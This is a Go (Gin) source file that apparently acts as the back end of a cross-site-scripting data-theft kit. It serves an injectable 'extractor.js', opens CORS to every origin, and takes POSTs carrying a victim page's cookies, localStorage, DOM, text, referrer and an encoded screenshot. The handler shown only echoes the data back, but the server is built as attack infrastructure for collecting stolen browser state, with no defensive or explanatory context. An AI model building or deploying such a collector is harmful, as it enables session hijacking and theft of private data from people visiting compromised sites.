package main

import (
	"net/http"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
)

type Data struct {
	URL           string `json:"url"`
	Origin        string `json:"origin"`
	UserAgent     string `json:"userAgent"`
	LocalStorage  string `json:"localStorage"`
	ScreenEncoded string `json:"screenshot_encoded"`
	Cookies       string `json:"cookies"`
	Referrer      string `json:"referrer"`
	Text          string `json:"text"`
	Dom           string `json:"dom"`
	Title         string `json:"title"`
	Iframe        bool   `json:"iframe"`
}

func main() {
	router := gin.Default()
	//router.StaticFile("/2.js", "./injector/2.js")
	router.StaticFile("/extractor.js", "./injector/extractor.js")
	router.Use(cors.New(cors.Config{
		AllowOrigins: []string{"*"},
		AllowMethods: []string{"*"},
		AllowHeaders: []string{"*"},
	}))
	router.POST("/post", func(c *gin.Context) {
		var data Data

		if err := c.ShouldBindJSON(&data); err != nil {
			c.JSON(http.StatusOK, err)
		}
		c.JSON(http.StatusOK, data)
		//fmt.Println(data)
	})
	router.Run()
}
